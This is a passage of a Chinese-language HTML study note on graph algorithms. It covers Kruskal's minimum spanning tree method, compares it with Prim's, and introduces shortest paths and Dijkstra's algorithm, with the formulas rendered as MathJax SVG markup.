249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g><g data-mml-node="mo" transform="translate(1397.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(1842.2,0)"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mn" transform="translate(518,-150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g><g data-mml-node="mo" transform="translate(2763.8,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>并入集合TE，同时<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.375ex" xmlns="http://www.w3.org/2000/svg" width="2.085ex" height="1.377ex" role="img" focusable="false" viewBox="0 -443 921.6 608.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mn" transform="translate(518,-150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g></g></g></svg></mjx-container>并入U。重复上述操作直至U=V为止，则T=(V,TE)为N的最小生成树。</p><h5 id="3-2-4-1-2-克鲁斯卡尔-Kruskal-算法"><a href="#3-2-4-1-2-克鲁斯卡尔-Kruskal-算法" class="headerlink" title="3.2.4.1.2 克鲁斯卡尔(Kruskal)算法"></a>3.2.4.1.2 克鲁斯卡尔(Kruskal)算法</h5><p>算法思想：设连通网N=(V,E)，令最小生成树初始状态为只有n个顶点而无边的非连通图T=(V,{})，每个顶点自成一个连通分量。在E中选取代价最小的边，若该边依附的顶点落在T中不同的连通分量上(即：不能形成环)，则将此边加入到T中；否则，舍去此边，选取下一条代价最小的边。以此类推，直至T中所有顶点都在同一连通分量上为止。</p><h5 id="3-2-4-1-3-两种算法的比较"><a href="#3-2-4-1-3-两种算法的比较" class="headerlink" title="3.2.4.1.3 两种算法的比较"></a>3.2.4.1.3 两种算法的比较</h5><div class="table-container"><table><thead><tr><th>算法名</th><th>普利姆算法</th><th>克鲁斯卡尔算法</th></tr></thead><tbody><tr><td>算法思想</td><td>选择点</td><td>选择边</td></tr><tr><td>时间复杂度</td><td><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="5.832ex" height="2.452ex" role="img" focusable="false" viewBox="0 -833.9 2577.6 1083.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"></path></g><g data-mml-node="mo" transform="translate(763,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(1152,0)"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(633,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(2188.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>(n为顶点数)</td><td><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="9.241ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 4084.3 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"></path></g><g data-mml-node="mo" transform="translate(763,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1152,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(1784.7,0)"><path data-c="6C" d="M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(278,0)"></path><path data-c="67" d="M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z" transform="translate(778,0)"></path></g><g data-mml-node="mo" transform="translate(3062.7,0)"><path data-c="2061" d=""></path></g><g data-mml-node="mi" transform="translate(3229.3,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mo" transform="translate(3695.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>(e为边数)</td></tr><tr><td>适用范围</td><td>稠密图</td><td>稀疏图</td></tr></tbody></table></div><h4 id="3-2-4-2-最短路径"><a href="#3-2-4-2-最短路径" class="headerlink" title="3.2.4.2 最短路径"></a>3.2.4.2 最短路径</h4><p>在有向图中A点(源点)到达B点(终点)的多条路径中，寻找一条各边权值之和最小的路径，即最短路径。最短路径与最小生成树不同，路径上不一定包含n个顶点，也不一定包含n-1条边。</p><p>两种常见的最短路径问题：</p><ul><li>单源最短路径——用迪杰斯特拉(Dijkstra)算法</li><li>所有顶点间的最短路径——用弗洛伊德(Floyd)算法</li></ul><h5 id="3-2-4-2-1-Dijkstra算法"><a href="#3-2-4-2-1-Dijkstra算法" class="headerlink" title="3.2.4.2.1 Dijkstra算法"></a>3.2.4.2.1 Dijkstra算法</h5><p>算法思想：</p><ol><li><p>初始化：先找出从源点<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.375ex" xmlns="http://www.w3.org/2000/svg" width="2.085ex" height="1.377ex" role="img" focusable="false" viewBox="0 -443 921.6 608.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mn" transform="translate(518,-150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g></g></g></svg></mjx-container>到各终点<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="2.119ex" height="1.359ex" role="img" focusable="false" viewBox="0 -443 936.4 600.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mi" transform="translate(518,-150) scale(0.707)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g></g></g></g></svg></mjx-container>的直达路径<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="6.97ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 3080.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(389,0)"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mn" transform="translate(518,-150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g><g data-mml-node="mo" transform="translate(1310.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(1755.2,0)"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mi" transform="translate(518,-150) scale(0.707)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g></g><g data-mml-node="mo" transform="translate(2691.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>，即通过一条弧到达的路径</p></li><li><p>选择：从这些路径中找出一条长度最短的路径<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="6.145ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2716.2 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(389,0)"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mn" transform="translate(518,-150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g><g data-mml-node="mo" transform="translate(1310.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(1755.2,0)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(2327.2,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p></li><li><p>更新：然后对其余各条路径进行适当调整</p><p>若在图中存在弧<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="6.179ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2731.1 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(389,0)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(961,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(1405.7,0)"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mi" transform="translate(518,-150) scale(0.707)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g></g><g data-mml-node="mo" transform="translate(2342.1,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>，且<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="25.077ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 11083.9 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(389,0)"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mn" transform="translate(518,-150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g><g data-mml-node="mo" 